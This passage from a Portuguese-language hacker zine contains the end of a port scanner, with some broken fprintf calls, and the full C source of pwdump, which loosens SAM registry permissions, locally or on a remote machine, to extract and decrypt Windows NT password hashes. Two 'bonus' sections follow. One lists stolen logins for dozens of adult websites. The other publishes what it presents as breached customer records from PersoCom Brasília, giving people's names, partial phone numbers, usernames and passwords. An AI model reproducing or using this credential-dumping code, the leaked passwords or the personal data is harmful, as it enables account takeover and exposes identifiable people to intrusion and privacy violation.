      fprintf(stderr,"[0;31mu[1msage[0m: [1m%s [0;5;34m<[0;1;34mhost[0;5;34m> [[0;1;34mhighest port[0;5;34m][0;1m[0m\n",argv[0]);
      fprintf("The Death Knights Port Scanner 1.2 by Cacaio!");
      fprintf("http://www.deathknights.com         Cacaio@deathknights.com");

      exit(0);
   }

   if (sscanf(argv[1],"%d.%d.%d.%d",&a,&b,&c,&d) != 4) {
      foo = gethostbyname(argv[1]);
      if (foo == NULL) {
       /* it happens when the address doesn't have a dns or occurr a dns error */
         fprintf(stderr,"[0;36me[1mrror[0m: [1mc[0ma[1;30mnnot [37mr[0me[1;30msolve [37mh[0mo[1;30mst [37m[0m%s\n",argv[1]);
         fprintf("The Death Knights Port Scanner 1.2 by Cacaio!");
         fprintf("http://www.deathknights.com         Cacaio@deathknights.com");

         exit(0);
      }
      sprintf(rmt_host,"%d.%d.%d.%d",(unsigned char )foo->h_addr_list[0][0],
              (unsigned char ) foo->h_addr_list[0][1], 
              (unsigned char ) foo->h_addr_list[0][2], 
              (unsigned char ) foo->h_addr_list[0][3]);
   } else {
      strncpy(rmt_host,argv[1],99);
   }

   if (argc > 2) {
      f = atoi(argv[2]);
   } else
      f = MAX_PORT;

       /* all ok... r0cking... */
   fprintf(stdout,"[0;31mS[1mcanning [0;31mh[1most [37m%s - [0;36mT[1mCP [0;36mp[1morts [37m1 [0;36mt[1mhrough [37m[0m%d\n",rmt_host,f);
   fprintf("The Death Knights Port Scanner 1.2 by Cacaio!");
   fprintf("http://www.deathknights.com         Cacaio@deathknights.com");

   for (e =1;e<=f;e++) {
    char serv[100];
      if (skan(e)) {
         bar = getservbyport(htons(e),"tcp"); 
         printf("%d (%s) [9Ci[0ms [1mr[0mu[1;30mnning[37m.\n",e,(bar == NULL) ? "UNKNOWN" :
                bar->s_name); 
      }
   }
       /* THE END!!! >) */
}

-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------

        Eh isso aih! Facam a festa!

                            Cacaio@a-Vip.com

-=[  12  ]=-
.---------------------------.
| WinNT Passwords [Parte 2]  \_______________________________________________
`----------------------------------------------------------------------------'
                                 by Cacaio

No tdk01, eu falei onde podem ser vistas em pleno texto as senhas do WinNT,
e agora falarei sobre um pequeno utilitario que transforma a password database 
que estra no registro do NT (em
HKEY_LOCAL_MACHINE\SECURITY\SAM\Domains\Account\Users) para um valido formato
sbpasswd. Isso daqui pode ajudar alguns admnistradores de Samba que tem uma
master password database em uma maquina WinNT e quer a colocar em sincronia
com o arquuivo smbpassword no sei servidor UNIX/Samba. Fazendo isto as senhas
nao aparecem mais como texto.

Este utilitario descarrega as entradas de password do NT no seguinte formato:

<user>:<id>:<lanman pw>:<NT pw>:comment:homedir:

Onde:
        <user> e' o user name no WinNT
        <id> e' o Relative ID (RID) do WinNT 
        <lanman pw> e' o lanman passwrod haso do usuario.
        <NT pw> e' o WinNT (md4) password hash -\
                                       Se o usuario nao tiver senha, aparecera 
                                   'NO PASSWORD*****'. Se a conta for invalida
                                   ou desativada, terao 32 '*''s.
-NOTA-
O homedir nao pode conter o caractere ':', pos eles sao utilizados como separa-
dores de campo no arquvo smbpasswd (sendo para UNIX), todos os caracteres ':'
depois da letra do triva se tornarao '_'.


      .----------------------------.  
      |    Como usar o pwdump       `----------------------------------.
      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -

        So uma sugestao: eu recomendo fazer isto nas suas maquinas NT e
entao criar users UNIX (no /etc/passwd) com os mesmos dados da conta no
UNIX e no NT RID.
        Estas contas no /etc/passwd devem ter desativado a entrada de
senhas, proibindo que usuarios NT loguem no UNIX via telnet. Isto nao
vai proibir que usem o Samba como um servidor. O smbpasswod criado de-
ve ser copado para $SAMBA/private/smbpasswd (onde $SAMBA e o diretorio
base em que voce instalou o Samba. Para deixar que o samba sempre en-
cripte as senhas de users, coloque o seguinte setting:

security = user encrypted passwords = yes

Isto no seu arquivo smb.conf. Fazendo isto o seu sistema estara apto para
usufruir dos beneficios deste utilitario.

O utilitario pwdump.exe pode colocar um \\machine name como argumento, 
isso e' para que quando utilizado, faca o que deve na maquina remota
ao inves da local, se tiver privilegios o suficiente, claro. Ele ira
pegar o estilo do password database da maquina local.


      .------------------.  
      |      Source       `--------------------------------------------.
      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -



Para compilar o source, voce precisa da biblioteca DES. Ela pode ser
obtida em:

ftp://ftp.psy.uq.oz.au/pub/Crypto/DES/libdes-4.01.tar.gz

Para compilar voce pode usar qualquer compilador.


-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------

/* file pwdump.c  */

/*
 *            T H E
 *       
 *      $$Pø"ý$b   ,gPø"ý$b   ,gPø""ý$b  ,gPø$$$$$$$$ý$b  ,gø   ý$b
 *      $$     $$  $$     $$  $$     $$       $$$$$$      $$     $$
 *      $$     $$  $$     "ý  $$     $$        $$$$       $$     $$
 *      $$     $$  $$Pý"  ,p  $$,   ,$$        `$$'       $$,   ,$$
 *      $$     $$  gg     $$  $$$$$$$$$         $$        $$$$$$$$$
 *      $$     $$  $$     $$  $$'   `$$         $$        $$'   `$$
 *      $$     $$  $$     $$  $$     $$         $$        $$     $$
 *      $$     $$  $$     $$  $$     $$        .$$.       $$     $$
 *      T$,   gP'  T$,   gP'  $$     $$        $$$$       $$     $$
 *      $$Pýýø"    $$Pýýø"    "ý     ý"        $$$$       "ý     ý"
 *                 ý"
 *                                        K N i G H T S
 *
 * Visit our webpage at http://www.deathknights.com
 *
 */

/*
 * (C) Jeremy Allison 1997. All rights reserved.
 * 
 * This program is free for commercial and non-commercial use.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted.
 *
 * THIS SOFTWARE IS PROVIDED BY JEREMY ALLISON ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */

#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

#include "des.h"


char *error_to_string(DWORD error)
{
  char *msgbuf;
  
  if(FormatMessage(
       FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
       NULL,
       error,
       MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), /* Default language */
       (char *)&msgbuf,
       0,
       NULL
       ) == 0)
    return 0;
  return msgbuf;
}

/*
 * Return a pointer to a string describing an os error.
 * error_to_string returns a pointer to LocalAlloc'ed
 * memory. Cache it and release when the next one is
 * requested.
 
1000
*/

char *str_oserr(DWORD err)
{
  static char *lastmsg = 0;

  if(lastmsg)
    LocalFree((HLOCAL)lastmsg);

  lastmsg = error_to_string(err);
  return lastmsg;
}


BOOL get_sid(const char *name, SID **ppsid)
{
  SID_NAME_USE sid_use;
  DWORD sid_size = 0;
  DWORD dom_size = 0;
  char *domain;

  *ppsid = 0;
  if(LookupAccountName(0, name, 0, &sid_size, 0, &dom_size, &sid_use) == 0) {
    if(GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
      fprintf( stderr, "get_sid: LookupAccountName for size on name %s failed. Error was %s\n",
            name, str_oserr(GetLastError()));
      return FALSE;
    }
  }

  *ppsid = (SID *)LocalAlloc( LMEM_FIXED, sid_size);
  domain = (char *)LocalAlloc( LMEM_FIXED, dom_size);
  if( *ppsid == 0 || domain == 0) {
    fprintf( stderr, "get_sid: LocalAlloc failed. Error was %s\n",
                 str_oserr(GetLastError()));
    if(*ppsid)
      LocalFree((HLOCAL)*ppsid);
    if(domain)
      LocalFree((HLOCAL)domain);
    *ppsid = 0;
    return FALSE;
  }

  if(LookupAccountName(0, name, *ppsid, &sid_size, domain, &dom_size, &sid_use) == 0) {
    fprintf( stderr, 
         "get_sid: LookupAccountName failed for name %s. Error was %s\n",
         name, str_oserr(GetLastError()));
    LocalFree((HLOCAL)*ppsid);
    LocalFree((HLOCAL)domain);
    *ppsid = 0;
    return FALSE;
  }

  LocalFree((HLOCAL)domain);
  return TRUE;
}


BOOL create_sd_from_list( SECURITY_DESCRIPTOR *sdout, int num, ...)
{
  va_list ap;
  SID **sids = 0;
  char *name;
  DWORD amask;
  DWORD acl_size;
  PACL pacl = 0;
  int i;

  if((sids = (SID **)calloc(1,sizeof(SID *)*num)) == 0) {
    fprintf(stderr, "create_sd_from_list: calloc fail.\n");
    return FALSE;
  }

  acl_size = num * (sizeof(ACL) +
             sizeof(ACCESS_ALLOWED_ACE) +
             sizeof(DWORD));

  /* Pega todos os SID's */
  va_start( ap, num);
  for( i = 0; i < num; i++) {
    name = va_arg( ap, char *);
    amask = va_arg(ap, DWORD);
    if(get_sid( name, &sids[i]) == FALSE)
      goto cleanup;
    acl_size += GetLengthSid(sids[i]);
  }
  va_end(ap);
  if((pacl = (PACL)LocalAlloc( LMEM_FIXED, acl_size)) == 0) {
    fprintf( stderr, "create_sd_from_list: LocalAlloc fail. Error was %s\n",
            str_oserr(GetLastError()));
    goto cleanup;
  }

  if(InitializeSecurityDescriptor( sdout, SECURITY_DESCRIPTOR_REVISION) == FALSE) {
    fprintf( stderr, "create_sd_from_list: InitializeSecurityDescriptor fail. Error was %s\n",
                 str_oserr(GetLastError()));
    goto cleanup;
  }
  if(InitializeAcl( pacl, acl_size, ACL_REVISION) == FALSE) {
    fprintf( stderr, "create_sd_from_list: InitializeAcl fail. Error was %s\n",
                 str_oserr(GetLastError()));
    goto cleanup;
  }
  va_start(ap, num);
  for( i = 0; i < num; i++) {
    ACE_HEADER *ace_p;
    name = va_arg( ap, char *);
    amask = va_arg( ap, DWORD);
    if(AddAccessAllowedAce( pacl, ACL_REVISION, amask, sids[i]) == FALSE) {
      fprintf( stderr, "create_sd_from_list: AddAccessAllowedAce fail. Error was %s\n",
                 str_oserr(GetLastError()));
      goto cleanup;
    }
    /* Make sure the ACE is inheritable */
    if(GetAce( pacl, 0, (LPVOID *)&ace_p) == FALSE) {
      fprintf( stderr, "create_sd_from_list: GetAce fail. Error was %s\n",
                 str_oserr(GetLastError()));
      goto cleanup;
    }
    ace_p->AceFlags |= ( CONTAINER_INHERIT_ACE | OBJECT_INHERIT_ACE);
  }

  /* Add the ACL into the sd. */
  if(SetSecurityDescriptorDacl( sdout, TRUE, pa
1000
cl, FALSE) == FALSE) {
    fprintf( stderr, "create_sd_from_list: SetSecurityDescriptorDacl fail. Error was %s\n",
               str_oserr(GetLastError()));
    goto cleanup;
  }
  for( i = 0; i < num; i++)
    if(sids[i] != 0)
      LocalFree((HLOCAL)sids[i]);
  free(sids);

  return TRUE;

cleanup:

  if(sids != 0) {
    for( i = 0; i < num; i++)
      if(sids[i] != 0)
        LocalFree((HLOCAL)sids[i]);
    free(sids);
  }
  if(pacl != 0)
    LocalFree((HLOCAL)pacl);
  return FALSE;
}


int set_userkeys_security( HKEY start, const char *path, SECURITY_DESCRIPTOR *psd, 
						  HKEY *return_key)
{
	HKEY key;
	DWORD err;
	char usersid[128];
	DWORD indx = 0;

	if((err = RegOpenKeyEx( start, path, 0, KEY_ENUMERATE_SUB_KEYS, &key)) !=
					ERROR_SUCCESS) {
		fprintf(stderr, "set_userkeys_security: Failed to open key %s to enumerate. \
Error was %s.\n",
				    path, str_oserr(err));
			return -1;
	}


	do {
		DWORD size;
		FILETIME ft;

		size = sizeof(usersid);
		err = RegEnumKeyEx(	key, indx, usersid, &size, 0, 0, 0, &ft);
		if(err == ERROR_SUCCESS) {
			HKEY subkey;

			indx++;
			if((err = RegOpenKeyEx( key, usersid, 0, WRITE_DAC, &subkey)) !=
						ERROR_SUCCESS) {
				fprintf(stderr, "set_userkeys_security: Failed to open key %s to set security. \
Error was %s.\n",
						usersid, str_oserr(err));
				RegCloseKey(key);
				return -1;
			}
			if((err = RegSetKeySecurity( subkey, DACL_SECURITY_INFORMATION,
										 psd)) != ERROR_SUCCESS) {
				fprintf(stderr, "set_userkeys_security: Failed to set security on key %s. \
Error was %s.\n",
						usersid, str_oserr(err));
				RegCloseKey(subkey);
				RegCloseKey(key);
				return -1;
			}
			RegCloseKey(subkey);
		}
	} while(err == ERROR_SUCCESS);

	if(err != ERROR_NO_MORE_ITEMS) {
		RegCloseKey(key);
		return -1;
	}
	if(return_key == 0)
		RegCloseKey(key);
	else
		*return_key = key;
	return 0;
}


int restore_sam_tree_access( HKEY start )
{
	char path[128];
	char *p;
	HKEY key;
	DWORD err;
	SECURITY_DESCRIPTOR sd;
	DWORD admin_mask;

	admin_mask = WRITE_DAC | READ_CONTROL;

	if(create_sd_from_list( &sd, 2, "SYSTEM", GENERIC_ALL,
							"Administrators", admin_mask) == FALSE)
		return -1;

	strcpy( path, "SECURITY\\SAM\\Domains\\Account\\Users");

	/* Remove the security on the user keys first. */
	if(set_userkeys_security( start, path, &sd, 0) != 0)
			return -1;

	/* now go up the path, restoring security */
	do {
		if((err = RegOpenKeyEx( start, path, 0, WRITE_DAC, &key)) !=
						ERROR_SUCCESS) {
			fprintf(stderr, "restore_sam_tree_access:Failed to open key %s to set \
security. Error was %s.\n",
					path, str_oserr(err));
			return -1;
		}
		if((err = RegSetKeySecurity( key, DACL_SECURITY_INFORMATION,
									 &sd)) != ERROR_SUCCESS) {
			fprintf(stderr, "restore_sam_tree_access: Failed to set security on key %s. \
Error was %s.\n",
					path, str_oserr(err));
			RegCloseKey(key);
			return  -1;
		}
		RegCloseKey(key);
		p = strrchr(path, '\\');
		if( p != 0) 
			*p = 0;
	} while( p != 0 );

	return 0;
}


int set_sam_tree_access( HKEY start, HKEY *return_key)
{
	char path[128];
	char *p;
	HKEY key;
	DWORD err;
	BOOL security_changed = FALSE;
	SECURITY_DESCRIPTOR sd;
	DWORD admin_mask;
	BOOL finished = FALSE;

	admin_mask = WRITE_DAC | READ_CONTROL | KEY_QUERY_VALUE | KEY_ENUMERATE_SUB_KEYS;

	if(create_sd_fr
1000
om_list( &sd, 2, "SYSTEM", GENERIC_ALL,
							"Administrators", admin_mask) == FALSE)
		return -1;

	strcpy( path, "SECURITY\\SAM\\Domains\\Account\\Users");
	p = strchr(path, '\\');

	do {
		if( p != 0) 
			*p = 0;
		else
			finished = TRUE;
		if((err = RegOpenKeyEx( start, path, 0, WRITE_DAC, &key)) !=
						ERROR_SUCCESS) {
			fprintf(stderr, "set_sam_tree_access:Failed to open key %s to set \
security. Error was %s.\n",
					path, str_oserr(err));
			return (security_changed ? -2: -1);
		}
		if((err = RegSetKeySecurity( key, DACL_SECURITY_INFORMATION,
									 &sd)) != ERROR_SUCCESS) {
			fprintf(stderr, "set_sam_tree_access: Failed to set security on key %s. \
Error was %s.\n",
					path, str_oserr(err));
			RegCloseKey(key);
			return (security_changed ? -2: -1);
		}
		security_changed = TRUE;
		RegCloseKey(key);
		if(p != 0) {
			*p++ = '\\';
			p = strchr(p, '\\');
		}
	} while( !finished );

	if(set_userkeys_security( start, path, &sd, &key) != 0)
		return -2;
	if(return_key == 0)
		RegCloseKey(key);
	else
		*return_key = key;
	return 0;
}


int get_int( char *array )
{
	return ((array[0]&0xff) + ((array[1]<<8)&0xff00) +
		   ((array[2]<<16)&0xff0000) +
		   ((array[3]<<24)&0xff000000));
}


void str_to_key(unsigned char *str,unsigned char *key)
{
	void des_set_odd_parity(des_cblock *);
	int i;

	key[0] = str[0]>>1;
	key[1] = ((str[0]&0x01)<<6) | (str[1]>>2);
	key[2] = ((str[1]&0x03)<<5) | (str[2]>>3);
	key[3] = ((str[2]&0x07)<<4) | (str[3]>>4);
	key[4] = ((str[3]&0x0F)<<3) | (str[4]>>5);
	key[5] = ((str[4]&0x1F)<<2) | (str[5]>>6);
	key[6] = ((str[5]&0x3F)<<1) | (str[6]>>7);
	key[7] = str[6]&0x7F;
	for (i=0;i<8;i++) {
		key[i] = (key[i]<<1);
	}
	des_set_odd_parity((des_cblock *)key);
}


void sid_to_key1(unsigned long sid,unsigned char deskey[8])
{
	unsigned char s[7];

	s[0] = (unsigned char)(sid & 0xFF);
	s[1] = (unsigned char)((sid>>8) & 0xFF);
	s[2] = (unsigned char)((sid>>16) & 0xFF);
	s[3] = (unsigned char)((sid>>24) & 0xFF);
	s[4] = s[0];
	s[5] = s[1];
	s[6] = s[2];

	str_to_key(s,deskey);
}


void sid_to_key2(unsigned long sid,unsigned char deskey[8])
{
	unsigned char s[7];
	
	s[0] = (unsigned char)((sid>>24) & 0xFF);
	s[1] = (unsigned char)(sid & 0xFF);
	s[2] = (unsigned char)((sid>>8) & 0xFF);
	s[3] = (unsigned char)((sid>>16) & 0xFF);
	s[4] = s[0];
	s[5] = s[1];
	s[6] = s[2];

	str_to_key(s,deskey);
}


int check_vp(char *vp, int vp_size, char **username, char **fullname,
			 char **comment, char **homedir,
			 char *lanman,int *got_lanman,
			 char *md4,  int *got_md4,
			 DWORD rid
			 )
{
	des_key_schedule ks1, ks2;
	des_cblock deskey1, deskey2;
	int username_offset = get_int(vp + 0xC);
	int username_len = get_int(vp + 0x10); 
	int fullname_offset = get_int(vp + 0x18);
	int fullname_len = get_int(vp + 0x1c);
	int comment_offset = get_int(vp + 0x24);
	int comment_len = get_int(vp + 0x28);
	int homedir_offset = get_int(vp + 0x48);
	int homedir_len = get_int(vp + 0x4c);
	int pw_offset = get_int(vp + 0x9c);

	*username = 0;
	*fullname = 0;
	*comment = 0;
	*homedir = 0;
	*got_lanman = 0;
	*got_md4 = 0;

	if(username_len < 0 || username_offset < 0 || comment_len < 0 ||
			   fullname_len < 0 || homedir_offset < 0 ||
		       comment_offset < 0 || pw_offset < 0)
		return -1;
	username_offset += 0xCC;
	fullname_offset += 0xCC;
	comment_offset += 0xCC;
	homedir_offset += 0xCC;
	pw_offset += 0xCC;

	if((*username = (char *)malloc(username_len + 1)) == 0) {
		fprintf(stderr, "check_vp: malloc fail for username.\n");
		return -1;
	}
	if((*fullname = (char *)malloc(fullname_len + 1)) == 0) 
1000
{
		fprintf(stderr, "check_vp: malloc fail for username.\n");
		free(*username);
		*username = 0;
		return -1;
	}
	if((*comment = (char *)malloc(comment_len + 1)) == 0) {
		fprintf(stderr, "check_vp: malloc fail for comment.\n");
		free(*username);
		*username = 0;
		free(*fullname);
		*fullname = 0;
		return -1;
	}
	if((*homedir = (char *)malloc(homedir_len + 1)) == 0) {
		fprintf(stderr, "check_vp: malloc fail for homedir.\n");
		free(*username);
		*username = 0;
		free(*fullname);
		*fullname = 0;
		free(*comment);
		*comment = 0;
		return -1;
	}
	wcstombs( *username, (wchar_t *)(vp + username_offset), username_len/sizeof(wchar_t));
	(*username)[username_len/sizeof(wchar_t)] = 0;
	wcstombs( *fullname, (wchar_t *)(vp + fullname_offset), fullname_len/sizeof(wchar_t));
	(*fullname)[fullname_len/sizeof(wchar_t)] = 0;
	wcstombs( *comment, (wchar_t *)(vp + comment_offset), comment_len/sizeof(wchar_t));
	(*comment)[comment_len/sizeof(wchar_t)] = 0;
	wcstombs( *homedir, (wchar_t *)(vp + homedir_offset), homedir_len/sizeof(wchar_t));
	(*homedir)[homedir_len/sizeof(wchar_t)] = 0;

	if(pw_offset >= vp_size) {
		/* No password */
		*got_lanman = 0;
		*got_md4 = 0;
		return 0;
	}

	if(pw_offset + 32 > vp_size) {
		/* Account disabled ? */
		*got_lanman = -1;
		*got_md4 = -1;
		return 0;
	}

	sid_to_key1(rid,(unsigned char *)deskey1);
	des_set_key((des_cblock *)deskey1,ks1);
	sid_to_key2(rid,(unsigned char *)deskey2);
	des_set_key((des_cblock *)deskey2,ks2);
	
	vp += pw_offset;
	des_ecb_encrypt((des_cblock *)vp,
					(des_cblock *)lanman, ks1, DES_DECRYPT);
	des_ecb_encrypt((des_cblock *)(vp + 8),
					(des_cblock *)&lanman[8], ks2, DES_DECRYPT);

	vp += 16;
	des_ecb_encrypt((des_cblock *)vp,
					(des_cblock *)md4, ks1, DES_DECRYPT);
	des_ecb_encrypt((des_cblock *)(vp + 8),
					(des_cblock *)&md4[8], ks2, DES_DECRYPT);

	*got_lanman = 1;
	*got_md4 = 1;
	return 0;
}


void print_hexval(char *val)
{
	int i;
	for(i = 0; i < 16; i++)
		printf("%02X", (unsigned char)val[i]);
}


void strip_text( char *txt )
{
	char *p;
	for( p = strchr(txt, ':'); p ; p = strchr( p + 1, ':'))
		*p = '_';
	for( p = strchr(txt, '\n'); p ; p = strchr(p + 1, '\n'))
		*p = '_';										   
	for( p = strchr(txt, '\r'); p ; p = strchr(p + 1, '\r'))
		*p = '_';
}


int printout_smb_entry( HKEY user, DWORD rid )
{
 	DWORD err;
	DWORD type;
	DWORD size = 0;
	char *vp;
	char lanman[16];
	char md4_hash[16];
	char *username;
	char *fullname;
	char *comment;
	char *homedir;
	int got_lanman;
	int got_md4;

	/* Find out how much space we need for the 'V' value. */
	if((err = RegQueryValueEx( user, "V", 0, &type, 0, &size)) 
								!= ERROR_SUCCESS) {
		fprintf(stderr, "printout_smb_entry: Unable to determine size needed \
for user 'V' value. Error was %s.\n.", str_oserr(err));
		return -1;
	}
	if((vp = (char *)malloc(size)) == 0) {
		fprintf(stderr, "printout_smb_entry: malloc fail for user entry.\n");
		return -1;
	}
	if((err = RegQueryValueEx( user, "V", 0, &type, (LPBYTE)vp, &size)) 
								!= ERROR_SUCCESS) {
		fprintf(stderr, "printout_smb_entry: Unable to read user 'V' value. \
Error was %s.\n.", str_oserr(err));
		free(vp);
		return -1;
	}
	/* Check heuristics */
	if(check_vp(vp, size, &username, &fullname, &comment, 
						&homedir, lanman, &got_lanman, 
		               md4_hash, &got_md4, rid) != 0) {
		fprintf(stderr, "Failed to parse entry for RID %X\n", rid);
		free(vp);
		return 0;
	}
	/* Ensure username of comment
1000
 don't have any nasty suprises
	   for us such as an embedded ':' or '\n' - see multiple UNIX
	   passwd field update security bugs for details... */
	strip_text( username );
	strip_text( fullname );
	strip_text( comment );
	strip_text( homedir );

	printf("%s:%d:", username, rid);
	if(got_lanman) {
                if(got_lanman == -1) /* Conta desativada? */
			printf("********************************");
		else
			print_hexval(lanman);
	} else
		printf("NO PASSWORD*********************");
	printf(":");
	if(got_md4) {
                if(got_md4 == -1)  /* Conta desativada? */
			printf("********************************");
		else
			print_hexval(md4_hash);
	} else
		printf("NO PASSWORD*********************");
	printf(":");
	if(*fullname)
		printf("%s", fullname);
	if(*fullname && *comment)
		printf(",");
	if(*comment)
		printf("%s", comment);
	printf(":");
	if(*homedir)					   
		printf("%s", homedir);
	printf(":\n");

	free(username);
	free(comment);
	free(homedir);
	free(vp);
	return 0;
}

int enumerate_users( HKEY key)
{
	DWORD indx = 0;
	DWORD err;
	DWORD rid;
	char usersid[128];

	do {
		DWORD size;
		FILETIME ft;

		size = sizeof(usersid);
		err = RegEnumKeyEx(	key, indx, usersid, &size, 0, 0, 0, &ft);
		if(err == ERROR_SUCCESS) {
			HKEY subkey;

			indx++;
			if((err = RegOpenKeyEx( key, usersid, 0, KEY_QUERY_VALUE, &subkey)) !=
						ERROR_SUCCESS) {
				fprintf(stderr, "enumerate_users: Failed to open key %s to read value. \
Error was %s.\n",
						usersid, str_oserr(err));
				RegCloseKey(key);
				return -1;
			}
			rid = strtoul(usersid, 0, 16);
			if(rid != 0) {
				if(printout_smb_entry( subkey, rid ) != 0) {
					RegCloseKey(subkey);
					return -1;
				}
			}
			RegCloseKey(subkey);
		}
	} while(err == ERROR_SUCCESS);

	if(err != ERROR_NO_MORE_ITEMS) {
		RegCloseKey(key);
		return -1;
	}
	return 0;
}

void usage(const char *arg0) {
	fprintf(stderr, "Usage: %s <\\\\machine>\n", arg0);
	exit(-1);
}

/*
 * uso: \\machine
 */

int main(int argc, char **argv)
{
	char username[128];
	DWORD size;
	HKEY start_key = HKEY_LOCAL_MACHINE;
	HKEY users_key;
	int err;

	if(argc > 2)
		usage(argv[0]);

	size = sizeof(username);
	if(GetUserName(username, &size)== FALSE) {
		fprintf(stderr, "%s: GetUserName() failed. Error was %s.", 
			argv[0], str_oserr(GetLastError()));
		return -1;
	}

	if(stricmp( "Administrator", username) != 0) {
		fprintf(stderr, "%s: You must be running as user Administrator \
to run this program\n", argv[0]);
		return -1;
	}

	if(argc == 2) {
		if((err = RegConnectRegistry( argv[1], HKEY_LOCAL_MACHINE, &start_key)) !=
			ERROR_SUCCESS) {
			fprintf(stderr, "%s: Failed to connect to registry on remote computer %s.\
Error was %s.\n", argv[0], argv[1], str_oserr(err));
			return -1;
		}
	}


	if((err = set_sam_tree_access( start_key, &users_key)) != 0) {
		if(err == -2)
			restore_sam_tree_access( start_key);
		return -1;
	}
	enumerate_users( users_key );
	RegCloseKey(users_key);
	restore_sam_tree_access( start_key );
	if(start_key != HKEY_LOCAL_MACHINE)
		RegCloseKey(start_key);
	return 0;
}


-=[  13  ]=-
.-----------.
| BONUS [1]  \_______________________________________________________________
`----------------------------------------------------------------------------'
                                 by Macleod

        Esse bonus eh pros punheteiros de plantao... la vao senhas de porn
        sites!

http://www.xpics.com/ass/ass.html?acb=acb138444-64000 L: too_sexy P: for_my_pussy
http://www.sexmuseum.com/?acb=acb138444-g4000 L: qwerty P: wet_pussy
http://www.xxxsexphotos.com/?acb=acb138444-n1000 L: destiny  P: analsex
http://members.sexroulette.com/?acb=acb138444-d4000 L: wet_horny  P: sucke_me
http://www.livesexstream.com/?acb=acb138444-j1000  	L: julio6 P: romeo6s.xoom.com/herbie/  l:HaRd p:coRe
http://members.pornheaven.com/   l:porno  p:archive
http://www.megapussy.com/members/  l/p:zena69
http://www.asianhq.com/members/ l:hacking@iseawatchwavmanuk.com  p:wavmanuk
http://www.pornotheater.com/lobby/members l:isp@hotmail.com p:ispno1
http://www.asianoh.com/playground/members.html l:willdroid p:rulezz
http://www.erosisland.com/members  l:zulu@eros.com  p:zulu
http://www.ladyasia.com/members/members/index.html l:stevie_13@hotmail.com p:vilely
http://www.cinemaxxx.com/members  l:nuts72@hotmail.com p:AB72780
http://www.digitaldesires.com/member/default.html l:whtrbt1 p:benny1
http://www.jordanlee.com/xxx/uncensrd.htm  l:JMTHILL@INNET.LU P:abgrtyu
http://www.aspenhill.com/asian/asina.htm l:oriental p:sex4sale
http://www.pornhq.com/members/index.html L:quanamar@yahoo.com p:bychaos
http://www.vavoom.com/members-only/index.html L:dingman  p:dongman
http://www.cinemaxxx.com/members/index.html l:PASSCORP@LAME.ORG p:zulu
www.oddity.com				l:JT4811	p:npoduq
www.kinkyporn.com			l:5379		p:1567
www.secondbell.com			l:764281	p:764281
www.hotchick.com			l:limited	p:passwords
www.cinemaxxx.com 			l:joe@io.org	p:password
www.aspweb.com                  	l:limited	p:passwords 
www.galleryx.com..                      l:556709        P:556709
www.kinkyporn.com                       L:5379          P:1567
schoolgirls-r-us.com                    L:duvet         P:duvet
www.photoshoot.com/hicks/members/       L:dappy         P:ajtkxwm5
www.pictureview.com                     L:heather       P:heather
www.hardchannels.com                    L:mongo69       P:lucifer
www.redlight.com                        L:dany21        P:dany
www.farmsex.com                         L:1234          P:1234
www.erosisland.com/members/             L:password      P:password
www.alleykatz.com/secure/right.htm      L:skyline       P:miki 
www.cybererotica.com                    L:scrappy       P:scrappy
www.jordanlee.com/xxx/uncensrd.htm L:x P:secret
www.brothel.com/Member/Members.html L:brothel P:brothel
www.greatxxx.com/sites/beast/members L:greatxxx.beast P:anicock62
www.realsexmagazine.com/pass.html L:qwerty P:qwerty
www.danisherotica.com l:bill p:bill
www.newrave.com l:badgod p:emperor
www.run-aways.com L:digicafe@pair.com P:071669
www.hustler.com l:slakr p:slakr
members.dirtypictures.com l: youup p: weed
204.181.154.146/members/entry.htm l:1888 p:2127
www.sexfantasy.com/html/members.m.html l:nbrawley P:nancy
www1.pictureview.com/groupindex.html l:bruce P:lee
www.upskirts.com/members/docs/newmcont.htm l:swingl P:upskirts



-=[  14  ]=-
.-----------.
| BONUS [2]  \_______________________________________________________________
`----------------------------------------------------------------------------'
                                 by Cacaio

        Senhas da PersoCom Brasilia.

        Estas senhas estao aqui por que os pedidos foram muitos, e eu tambem
ja tava pensando nisso a um certo tempo... hehehe.... se divirtam!
Ahhh... se seus dados estao aqui nao me culpe, mas sim a PersoCom. Ela que me 
liberou todos estes dados tendo a seguranca tao falha...

Nome completo = Tyrone ferreira Barbosa 
User Name     = tyrone          Senha = 390390
Fone          = ??? 2576
1omail        = tyrone          Senha = 390390
2omail        = thays.barbosa   Senha = 390390
3omail        = talys           Senha = 390390
-------------------------------------------------------------------------------------
Nome Completo= Manoel Humberto Ribeiro 
fone= ???-1734
userid=mribeiro
e-mail=mribeiro
senha= 030500
-----------------------------------------------------------------------------------
Nome Completo: Maternal e Jardim de Infancia Casinha Branca
 User Name: cbranca                          Senha: 263037
 Telefone : ???-7211
 E-mail   : casa.branca                      Senha: 263037

---------------------------------------------------------------------------------

Nome Completo: Cristinalice Mendonça Souza de Oliveira
  User Name: cristinalice                Senha: 590303
  Telefone : ???-3684
  1o E-mail: cris.mso                    Senha: 590303

